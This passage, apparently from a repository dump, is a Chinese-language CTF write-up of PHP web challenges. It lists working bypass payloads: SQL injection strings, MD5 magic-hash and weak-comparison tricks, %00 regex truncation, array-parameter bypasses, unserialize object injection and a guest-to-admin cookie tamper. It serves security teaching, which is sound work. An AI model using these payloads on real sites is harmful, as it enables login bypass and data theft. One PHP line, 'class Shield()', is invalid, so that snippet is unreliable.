'e10adc3949ba59abbe56e057f20f883e' #&pass=123456`\n\n资料：\n\n- [DUTCTF-2015-Writeup](http://bobao.360.cn/ctf/learning/129.html)\n\n## 10 urldecode二次编码绕过\n\n`h`的`URL`编码为：`%68`，二次编码为`%2568`，绕过\n\n`http://127.0.0.1/Php_Bug/10.php?id=%2568ackerDJ`\n\n资料：\n\n- [URL编码表](https://baike.baidu.com/item/URL%E7%BC%96%E7%A0%81/3703727?fr=aladdin)\n\n\n## 11 sql闭合绕过\n\n构造exp闭合绕过\n`admin')#`\n\n\n## 12 X-Forwarded-For绕过指定IP地址\n\n`HTTP`头添加`X-Forwarded-For:1.1.1.1`\n\n## 13 md5加密相等绕过\n\n`http://127.0.0.1/Php_Bug/13.php?a=240610708`\n\n`==`对比的时候会进行数据转换，`0eXXXXXXXXXX` 转成`0`了，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行 \n\n```\nvar_dump(md5('240610708') == md5('QNKCDZO'));\nvar_dump(md5('aabg7XSs') == md5('aabC9RqS'));\nvar_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));\nvar_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));\nvar_dump('0010e2' == '1e3');\nvar_dump('0x1234Ab' == '1193131');\nvar_dump('0xABCdef' == ' 0xABCdef');\n\nmd5('240610708'); // 0e462097431906509019562988736854 \nmd5('QNKCDZO'); // 0e830400451993494058024219903391 \n```\n\n把你的密码设成 `0x1234Ab`，然后退出登录再登录，换密码 `1193131`登录，如果登录成功，那么密码绝对是明文保存的没跑。 \n\n\n同理，密码设置为 `240610708`，换密码 `QNKCDZO`登录能成功，那么密码没加盐直接`md5`保存的。\n\n资料：\n\n- [PHP 探测任意网站密码明文/加密手段办法](https://www.v2ex.com/t/188364)\n\n## 14 intval函数四舍五入\n\n`1024.1`绕过\n\n资料：\n\n- [ PHP intval()函数利用](http://blog.csdn.net/wangjian1012/article/details/51581564)\n\n## 15 strpos数组绕过NULL与ereg正则%00截断\n\n- 方法一：\n既要是纯数字,又要有`’#biubiubiu’`，`strpos()`找的是字符串,那么传一个数组给它,`strpos()`出错返回`null,null!==false`,所以符合要求. \n所以输入`nctf[]=`\n那为什么`ereg()`也能符合呢?因为`ereg()`在出错时返回的也是`null`,`null!==false`,所以符合要求. \n\n- 方法二：\n字符串截断,利用`ereg()`的`NULL`截断漏洞，绕过正则过滤\n`http://127.0.0.1/Php_Bug/16.php?nctf=1%00#biubiubiu` 错误\n需将#编码\n`http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu`\n正确\n\n## 16 SQL注入or绕过\n\n```\n$query='SELECT * FROM users WHERE name=\\''admin\\'\\' AND pass=\\''or 1 #'\\';';\n```\n\n`?username=admin\\'\\' AND pass=\\''or 1 #&password=`\n\n## 17 密码md5比较绕过\n\n```\n//select pw from ctf where user=''and 0=1 union select  'e10adc3949ba59abbe56e057f20f883e' #\n```\n\n`?user='and 0=1 union select  'e10adc3949ba59abbe56e057f20f883e' #&pass=123456`\n\n## 18 md5()函数===使用数组绕过\n\n若为`md5($_GET['username']) == md5($_GET['password'])`\n则可以构造：\n`http://127.0.0.1/Php_Bug/18.php?username=QNKCDZO&password=240610708`\n因为`==`对比的时候会进行数据转换，`0eXXXXXXXXXX` 转成`0`了\n也可以使用数组绕过\n`http://127.0.0.1/Php_Bug/18.php?username[]=1&password[]=2`\n\n\n但此处是`===`，只能用数组绕过，`PHP`对数组进行`hash`计算都会得出`null`的空值\n`http://127.0.0.1/Php_Bug/18.php?username[]=1&password[]=2`\n\n## 19 ereg()函数strpos() 函数用数组返回NULL绕过\n\n- 方法一：\nereg()正则函数可以用`%00`截断\n`http://127.0.0.1/Php_Bug/19.php?password=1%00--`\n\n- 方法二：\n将`password`构造一个`arr[]`，传入之后，`ereg`是返回`NULL`的，`===`判断`NULL`和 `FALSE`，是不相等的，所以可以进入第二个判断，而`strpos`处理数组，也是返回`NULL`，注意这里的是`!==`，`NULL!==FALSE`,条件成立，拿到`flag`\n`http://127.0.0.1/Php_Bug/19.php?password[]=`\n\n## 20 十六进制与数字比较\n\n这里，它不让输入1到9的数字，但是后面却让比较一串数字，平常的方法肯定就不能行了，大家都知道计算机中的进制转换，当然也是可以拿来比较的，`0x`开头则表示`16`进制，将这串数字转换成`16`进制之后发现，是d`eadc0de`，在开头加上`0x`，代表这个是`16`进制的数字，然后再和十进制的 `3735929054`比较，答案当然是相同的，返回`true`拿到`flag`\n\n```\necho  dechex ( 3735929054 ); // 将3735929054转为16进制\n结果为：deadc0de\n```\n构造：\n`http://127.0.0.1/Php_Bug/20.php?password=0xdeadc0de`\n\n## 21 数字验证正则绕过\n\n`0 >= preg_match('/^[[:graph:]]{12,}$/', $password)`\n意为必须是12个字符以上（非空格非TAB之外的内容）\n\n```\n$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; \nif (6 > preg_match_all($reg, $password, $arr)) \n```\n意为匹配到的次数要大于6次\n\n```\n$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 \nforeach ($ps as $pt) \n{ \n    if (preg_match(\"/[[:$pt:]]+/\", $password)) \n        $c += 1; \n} \nif ($c < 3) break; \n```\n意为必须要有大小写字母，数字，字符内容三种与三种以上\n\n```\nif (\"42\" == $password) echo $flag; \n```\n意为必须等于`42`\n\n答案：\n```\n42.00e+00000000000 \n或\n420.000000000e-1\n```\n资料：\n\n- [安全宝「约宝妹」代码审计CTF题解](http://bobao.360.cn/learning/detail/248.html)\n\n- [各种版本PHP在线迷你运行脚本](https://3v4l.org/jYSpC)\n\n- [PHP Comparison Operators](http://php.net/manual/en/language.operators.comparison.php)\n\n## 22 弱类型整数大小比较绕过\n\n`is_numeric($temp)?die(\"no numeric\"):NULL;`\n不能是数字\n\n```\nif($temp>1336){\n    echo $flag;\n} \n```\n又要大于`1336`\n\n利用`PHP`弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型`intval`再比。如果输入一个`1337a`这样的字符串，在`is_numeric`中返回`true`，然后在比较时被转换成数字`1337`，这样就绕过判断输出`flag`。\n\n`http://127.0.0.1/php_bug/22.php?password=1337a`\n\n## 23 md5函数验证绕过\n\n`if(md5($temp)==0)`\n要使`md5`函数加密值为`0`\n\n- 方法一：\n使`password`不赋值，为`NULL`，`NULL == 0`为`true`\n`http://127.0.0.1/php_bug/23.php?password=`\n`http://127.0.0.1/php_bug/23.php`\n\n- 方法二：\n经过MD5运算后，为`0e******`的形式，其结果为`0*10`的`n`次方，结果还是零\n`http://127.0.0.1/php_bug/23.php?password=240610708`\n`http://127.0.0.1/php_bug/23.php?password=QNKCDZO`\n\n## 24 md5函数true绕过注入\n\n`$sql = \"SELECT * FROM users WHERE password = '\".md5($password,true).\"'\";`\n`md5($password,true)`\n将`md5`后的`hex`转换成字符串\n\n如果包含`'or'xxx`这样的字符串，那整个`sql`变成\n\n`SELECT * FROM admin WHERE pass = ''or'xxx'`就绕过了\n\n字符串：`ffifdyop`\n\n`md5`后，`276f722736c95d99e921722cf9ed621c`\n`hex`转换成字符串：` 'or'6<trash>`\n![](./img/24_1.png)\n\n构造：`?password=ffifdyop`\n\n资料：\n\n- [MD5加密后的SQL 注入](http://blog.csdn.net/greyfreedom/article/details/45846137)\n\n- [敏感函数md5()](http://www.am0s.com/functions/204.html)\n\n- [php黑魔法](http://www.xmanblog.net/2017/04/04/php-magic/)\n\n## 25 switch没有break 字符与0比较绕过\n\n让我们包含当前目录中的`flag.php`，给`which`为`flag`，这里会发现在`case 0`和`case 1`的时候，没有`break`，按照常规思维，应该是`0`比较不成功，进入比较`1`，然后比较`2`，再然后进入`default`，但是事实却不是这样，事实上，在 `case 0`的时候，字符串和`0`比较是相等的，进入了`case 0`的方法体，但是却没有`break`，这个时候，默认判断已经比较成功了，而如果匹配成功之后，会继续执行后面的语句，这个时候，是不会再继续进行任何判断的。也就是说，我们`which`传入`flag`的时候，`case 0`比较进入了方法体，但是没有`break`，默认已经匹配成功，往下执行不再判断，进入`2`的时候，执行了`require_once flag.php`\n\nPHP中非数字开头字符串和数字 `0`比较`==`都返回`True`\n\n因为通过逻辑运算符让字符串和数字比较时，会自动将字符串转换为数字.而当字符串无法转换为数字时，其结果就为`0`了，然后再和另一个`0`比大小，结果自然为`ture`。注意：如果那个字符串是以数字开头的，如`6ldb`，它还是可以转为数字`6`的，然后和`0`比较就不等了（但是和`6`比较就相等）\n`if($str==0)` 判断 和 `if( intval($str) == 0 )` 是等价的\n\n```\n可以验证：\n<?php\n$str=\"s6s\";\nif($str==0){ echo \"返回了true.\";}\n?>\n```\n要字符串与数字判断不转类型方法有：\n- 方法一：\n`$str=\"字符串\";if($str===0){   echo \"返回了true.\";} `\n\n- 方法二：\n`$str=\"字符串\";if($str==\"0\"){   echo \"返回了true.\";} ,`\n\n此题构造：`http://127.0.0.1/php_bug/25.php?which=aa`\n\n资料：\n\n- [PHP中字符串和数字 0 比较为什么返回true？](https://zhidao.baidu.com/question/336186893.html)\n\n## 26 unserialize()序列化\n\n说明`flag`在`pctf.php`，但`showimg.php`中不允许直接读取`pctf.php`，只有在`index.php`中可以传入变量`class`\n，`index.php`中`Shield`类的实例`$X = unserialize($g)`，`$g = $_GET['class'];`，`$X`中不知`$filename`变量，但需要找的是：`$filename = \"pctf.php\"`，现`$X`已知，求传入的`class`变量值。\n可以进行序列化操作：\n```\n<!-- answer.php -->\n<?php\n\nrequire_once('shield.php');\n$x = class Shield();\n$g = serialize($x);\necho $g;\n\n?>\n\n<!-- shield.php -->\n<?php\n    //flag is in pctf.php\n    class Shield {\n        public $file;\n        function __construct($filename = 'pctf.php') {\n            $this -> file = $filename;\n        }\n        \n        function readfile() {\n            if (!empty($this->file) && stripos($this->file,'..')===FALSE  \n            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) {\n                return @file_get_contents($this->file);\n            }\n        }\n    }\n?>\n\n```\n得到：\n`O:6:\"Shield\":1:{s:4:\"file\";s:8:\"pctf.php\";}`\n构造：\n`http://web.jarvisoj.com:32768/index.php?class=O:6:\"Shield\":1:{s:4:\"file\";s:8:\"pctf.php\";}`\n\n## 30 利用提交数组绕过逻辑\n\n首先是给了一个页面，提示 `Sorry. You have no permissions.`。\n\n查看 cookie 发现是 base64 。解密之后替换中间的 `guest` 为 `admin` 绕过登陆限制。\n\n这段代码首先会查看提交的请求中是否存在 `<>` 如果没有则将传入的数据(如果是数组)转化为字符串。如果其中存在 `<>` 则将flag生成在一个随机命名的文件中。\n`implode()` 这个函数需要传入数组，如果传入的是字符串将报错，变量 `$s` 自然也就没有值。\n\n    if($auth){\n        if(isset($_POST['filename'])){\n            $filename = $_POST['filename'];\n            $data = $_POST['data'];\n            if(preg_match('[<>?]', $data)) {\n                die('No No No!');\n            }\n            else {\n                $s = implode($data);\n                if(!preg_match('[<>?]', $s)){\n                    $flag=\"None.\";\n                }\n                $rand = rand(1,10000000);\n                $tmp=\"./uploads/\".md5(time() + $rand).$filename;\n                file_put_contents($tmp, $flag);\n                echo \"your file is in \" . $tmp;\n            }\n        }\n        else{\n            echo \"Hello admin, now you can upload something you are easy to forget.\";\n            echo \"<br />there are the source.<br />\";\n            echo '<textarea rows=\"10\" cols=\"100\">';\n            echo htmlspecialchars(str_replace($flag,'flag{???}',file_get_contents(__FILE__)));\n            echo '</textarea>';\n        }\n    }\n\n![](img/30_1.png)\n\n想要通过Post请求的形式传入数组可以使用 `data[0]=123&data[1]=<>` 的形式传入数组，这样的话在执行 `implode()` 函数的时候就不会使 `&s` 为空，成功绕过这段逻辑拿到flag。\n\n![](img/30_2.png)\n"
+        },
+        {
+          "name": "img",
+          "type": "tree",
+          "content": null
+        }
+      ]
+    }
+  ]
+}
